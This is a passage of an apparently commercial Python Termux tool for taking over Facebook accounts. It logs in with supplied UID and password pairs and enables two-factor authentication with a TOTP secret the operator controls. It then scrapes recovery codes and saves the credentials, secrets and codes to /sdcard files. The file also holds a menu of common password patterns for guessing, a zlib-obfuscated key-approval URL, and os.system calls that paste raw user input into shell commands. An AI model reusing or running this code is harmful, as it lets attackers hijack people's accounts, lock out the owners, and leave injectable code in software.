    print ('\033[1;33mFor Example /sdcard/filename.txt')
    tf = input("\033[1;32minput file path for save original: \033[0;97m")
    if '/sdcard/' in tf:
        os.system("sort -r "+ sf +" | uniq  >> "+tf)
        print("File sucessfull save as "+tf)
        input('\033[1;32mPress Enter To Back\033[0;97m')
        menu()
    else:
        print ('\033[1;31mWrong input Directory')
        print ('\033[1;37mPut /sdcard/filename.txt\033[0;97m')
        time.sleep(3)
        double()

def separate():
    os.system('clear')
    print (logo)
    print ('\033[1;36mSeparate Links From File\033[0;97m')
    print (47*'-')
    file_name = input('\033[1;32mInput file name: ')
    print(47*'-')
    if file_name == '':
        menu()
    print ('\033[1;33mFor Example /sdcard/filename.txt\033[0;97m')
    print (47*'-')
    new_save = input('\033[1;36mSave New file Name: \033[0;97m')
    if "/sdcard/" not in new_save:
        print ('Put /sdcard/yourfile name.txt')
        time.sleep(2)
        separate()
    elif new_save == '':
        menu()
    try:
        limit = int(input('\033[1;33mHow many links do you want to separate? \033[0;97m'))
    except:
        limit = 1
    y = 0
    for y in range(limit):
        y+=1
        links = input('\033[0;97mSelect link %s: '%(y))
        os.system('cat '+file_name+' | grep '+links+' >> '+new_save)
    print(47*'-')
    print('\033[1;32mLinks Separate successfully')
    print('\033[1;33mNew file saved as: /sdcard/'+new_save)
    print(47*'-')
    input('\033[1;36mPress enter to back ')
    menu()

def cutrs():
    os.system('clear')
    print (logo)
    print ('\033[1;33mCut Links From Used File\033[0;97m')
    print (47*'-')
    bc = input('\033[1;32mPut File: \033[0;97m')
    try:
        ba = open(bc, 'r').read().splitlines()
    except (FileNotFoundError, IOError):
        print ('\033[0;97mFile Not Found')
        time.sleep(3)
        cutrs()
    print ('\033[1;33mExample /sdcard/filename.txt\033[0;97m')
    sab = input('\033[1;36mSave File Name: \033[0;97m')
    print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
    try:
        fdv = int(input('\033[1;32mSelect Cuting Limit From File: \033[0;97m'))
        dy = ba[fdv:5000000]
        bos = '\n'.join(dy)
        open(sab, 'w').write(bos + '\n')
        print ('\033[1;33mFile successfully Save > '+sab)
        print (47*'-')
        input('\033[1;32mPress Enter To Back\033[0;97m')
        menu()
    except (ValueError, EOFError, KeyboardInterrupt):
        print ('\033[1;33m\nSelect Valid limit\033[0;97m')
        print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
        input('\033[1;32mPress Enter Go To Back\033[0;97m')
        cutrs()
# =======================================
def f2():
    clear()
    print('\033[1;32m[1] Enable 2F ')
    print('\033[1;32m[2] Change Pass ')
    print('\033[1;32m[B] Back')
    line()
    chg = input('\033[1;36m [*] Choose Opt : ')
    if chg =='1':
        idp()
    elif chg =='2':
        print('\033[1;33m Will BE Available Soon :)')
        time.sleep(2)
        f2()
    elif chg =='2' or chg =='B':
        menu()
        
# ==================        =================================
def getCookie(e,p):
    session=requests.Session()
    head = {
        'Host': 'm.alpha.facebook.com',
        'viewport-width': '980', 
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?1', 
        'sec-ch-ua-platform': 'Android', 
        'sec-ch-prefers-color-scheme': 'light',
        'dnt': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
        'sec-fetch-site': 'none', 
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9'
            }
    getlog = session.get(f'https://m.alpha.facebook.com/login/device-based/password/?uid={e}&flow=login_no_pin&refsrc=deprecated&_rdr')
    idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":e,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":p}
    complete = session.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head).text
    #print(str(complete))
    dc=dict(session.cookies)
    coki=";".join([k+"="+v for k,v in dc.items()])
    return coki

def tfa(e,p):
    try:
        global n,lim,tf
        print(f"{n}/{lim} [2F-{tf}]",end="\r")
        c=getCookie(e,p)
        #print(c)
        #if "checkpoint" in c:
               #print("checkpoint!")
                #pass
        url="https://m.facebook.com/security/2fac/setup/intro"
        s=requests.Session()
        #1st sub options
        #print("\u001b[1;32mSTEP 1:\u001b[0m")
        
        r1=s.get(url,cookies={'cookie':c}).text
        #open("/sdcard/k.html","w").write(str(r1))
        #print("Getting Next Page link...")
        #Getting 2nd link . 
        sp=bs(r1,"html.parser")
        a=sp.find_all("a")
        u2=""
        for i in a:
            l=i["href"]
            if "qrcode" in l:
                    u2=l
        #print(u2)
        #print("\u001b[1;32mSTEP 2:\u001b[0m")
        #print(f"Link:{u2}")
        try:
            r2=s.get(u2,cookies={'cookie':c}).text
            #open("/sdcard/e2.html","w").write(str(r2))
        except Exception as exp:
            #print(exp)
            pass
            #sys.exit()
        #print("\u001b[1;32mSTEP 3:\u001b[0m")
        sp2=bs(r2,"html.parser")
        a=sp2.find_all("form")[1]
        x=a["action"]
        mode=0
        if "https://m.facebook.com" in x:
            mode =1
        else:
            mode=2
        
        def m1():
            nonlocal e,p,c,s,a,x,r2
            nonlocal mode
            lx=""
            rx=""
            dx={}
            if mode==1:
                #print("\u001b[1;32mReAuth\u001b[0m")
                l2=x
                inps=a.find_all("input")
                d2={"pass":p}
                for i in inps:
                    try:
                        d2[i["name"]]=i["value"]
                    except:
                        pass
                dx=d2
                #print(f"Got Data for auth: {d2}")
                #print(f"Reauth Submission:{l2}")
                l2="https://m.facebook.com"+l2
                hd = {
                    'Host': 'm.facebook.com',
                    'path':'/security/2fac/setup/intro',
                    'method':'GET',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'referer': l2,
                    'sec-ch-ua': '"(Not(A:Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:117.0) Gecko/20010101 Firefox/117.0/6iIUEMpQ05chNQA',
                }
        
                r2=s.post(l2,headers=hd,data=dx,cookies={'cookie':c}).text
                #print("Reauth Done.The key Page")
                sp2=bs(r2,"html.parser")
                a=sp2.find_all("form")[1]
                x=a["action"]
        
            
            lx="https://m.facebook.com"+x
            d2={}
            inps=a.find_all("input")
            for i in inps:
                try:
                    d2[i["name"]]=i["value"]
                except:
                    pass
            dx=d2
            #print(dx,lx)
            rx=s.post(lx,data=dx,cookies={'cookie':c}).text
            #enter key page load
            
            
            
            
            #print(key)
            #open("/sdcard/k2.html","w").write(str(rx))#get key
            
            ptrn="secret=\w{32}"
            
            #old
            key=re.search(ptrn,str(r2)).group().replace("secret=","")
                
            #print(f"\u001b[1;32mThe Key:{key}")
            
            open("/sdcard/2fk.txt","a").write(e+"  "+p+"\n"+key+"\n")
            
            
            #Step 4 load the enter page
            #print("\u001b[1;32mSTEP 4:\u001b[0m")
            d3={}
            sp4=bs(rx,"html.parser")
            a=sp4.find_all("form")[2]
            inps=a.find_all("input")
            for i in inps:
                try:
                    d3[i["name"]]=i["value"]
                except:
                    pass
            l3="https://m.facebook.com"+a["action"]
            #print(f"Key Submit Page Url:{l3}")
            #print(d3)
            cg=pyotp.TOTP(key)
            d3["code"]=cg.now()
            r4=s.post(l3,data=d3
            ,cookies={'cookie':c}
            ).text
            #open("/sdcard/k3.html","w").write(str(r4))
            
            
            #STEP 5 Enter the key
            #print("\u001b[1;32mSTEP 5:\u001b[0m")
            #code sub 2
        
            print("\u001b[1;32mKey Submitted. 2F Done\u001b[0m")
            
            return(r4)
        
        #####Recovery Codes
        #open("/sdcard/k4.html","r").read()
        def getRcodes(cc):
            print("\u001b[1;32mGETTING RECOVERY CODES:\u001b[0m")
            sp2=bs(cc,"html.parser")
            #
            
            a=sp2.find_all("form")[1]
            l5="https://m.facebook.com"+a["action"]
            
            #print(l5)
            
            #2f page
            r5=s.get(l5,cookies={'cookie':c}).text
            
            
            #open("/sdcard/k5.html","w").write(str(r5))
            
            sp2=bs(r5,"html.parser")
            a=sp2.find_all("a")
            u2=""
            for i in a:
                l=i["href"]
                if "/security/2fac/factors/recovery-code" in l:
                        u2="https://m.facebook.com"+l
                        
            r6=s.get(u2,cookies={'cookie':c}).text
            #open("/sdcard/k6.html","w").write(str(r6))           
            
            sp2=bs(r6,"html.parser")
            a=sp2.find_all("form")[1]
            inps=a.find_all("input")
            l6="https://m.facebook.com"+a["action"]
            d4={}
            for i in inps:
                    try:
                        d4[i["name"]]=i["value"]
                    except:
                        pass
            #print(l6,d4)
            r7=s.post(l6,data=d4,cookies={'cookie':c}).text
            #open("/sdcard/k7.html","w").write(str(r7))
            
            
            rcs=r7
            #open("/sdcard/k5.html","r").read()
            sp2=bs(rcs,"html.parser")
            rc=[]
            frc=sp2.find_all("span",class_="cp")
            return frc
            
        if "checkpoint" not in c:
            try:
                cc=m1()
                frc=getRcodes(cc)
                print(f"\u001b[1;32m{e} {p}")
                tf+=1
                print("\u001b[1;32mGetting Recovery Codes:")
                for i in frc:
                    rcode=i.string
                    print(rcode)
                    open("/sdcard/2F/Codes.txt","a").write("\n"+rcode+"\n")
                print("\u001b[0m")
            except:
                pass
        else:
            print(f"Checkpoint ID {e}")
    except Exception as exp:
        if "c_user" in c:
            print(f"LOCKED ID {e}")
        elif "checkpoint" in c:
            print(f"Checkpoint ID {e}")
        else:
            print(f"Incorrect pass {e}")
    n+=1

def idp():
        idp=input("UID|PASS:")#open(input("FILE PATH: "),"r").read().splitlines()
        e,p=idp.split("|")
        try:
            tfa(e,p)
        except Exception as exp:
            print("Exp")

# =======================================
def psd():
    os.system('clear')
    print(logo)
    print('\033[1;32[1] Pass For Old Pak Ids')
    print('\033[1;32[2] Pass For New Ids Any Country')
    line()
    psd=input('\033[1;36m [+] Choose Option : ')
    if psd =='1':
        print('\033[1;36m[1] First Last')
        print('\033[1;36m[2] First last')
        print('\033[1;36m[3] first last')
        print('\033[1;36m[4] firstlast')
        print('\033[1;36m[5] first123')
        print('\033[1;36m[6] first12345')
        print('\033[1;36m[7] first1122')
        print('\033[1;36m[8] first786')
        print('\033[1;36m[9] firstlast786')
        print('\033[1;36m[10] firstlast1122')
        line()
    elif psd =='2':
        print('\033[1;36m[1] First Last')
        print('\033[1;36m[2] First last')
        print('\033[1;36m[3] first last')
        print('\033[1;36m[4] firstlast')
        print('\033[1;36m[5] first123')
        print('\033[1;36m[6] first12345')
        line()
    else:
        print('\033[1;31m  Choose Valid ')
        time.sleep(1)
        menu()
# ================================================================
def socal():
    os.system('clear')
    print(logo)
    print('\033[1;32m[1] Contact On Facebook')
    print('\033[1;32m[2] Contact On Whatsapp')
    line()
    soc=input('\033[1;36m [+] Choose Contact : ')
    if soc =='1':
        os.system(f"termux-open-url https://www.facebook.com/profile.php?id=100075826572941")
    elif soc =='2':
        os.system(f"termux-open-url https://wa.me/+923157036228?")
# ===================================================================
def grp():
    os.system(f"termux-open-url https://facebook.com/groups/1232645930967124/")
# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
def wtjoin():
    os.system(f"termux-open-url https://chat.whatsapp.com/JjToPJVRbehC3NMvVzQqik")
# ==================================================================
def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    
    return "KAMI"+myid+xp
km=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcfN\xcc\xcd\xcc\xb444\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd4O,((\xca/K\xcc)\xa9(\xd1\xcb(\xc9\xcd\x01\x00\xfd\xfd\x12\xd4').decode()
   
def aprv():
    global km
    r=requests.get(km).text
    k=getKey()
    if k in r:
        menu()
    else:
                os.system('clear')
                print(logo)
                print('\033[1;32mYour Key Is Not Approved Buy The Command First')
                line()
                print('\033[1;32mSend Key To Me In Whatsapp')
                line()
                print(f" Your Key:{k}")
                line()
                input('\033[1;32m  Press Enter To Send Key  ')
                os.system(f"termux-open-url https://wa.me/+923157036228?text={k}")
                aprv()
                sys.exit()

# def run():
#     aprv()
menu()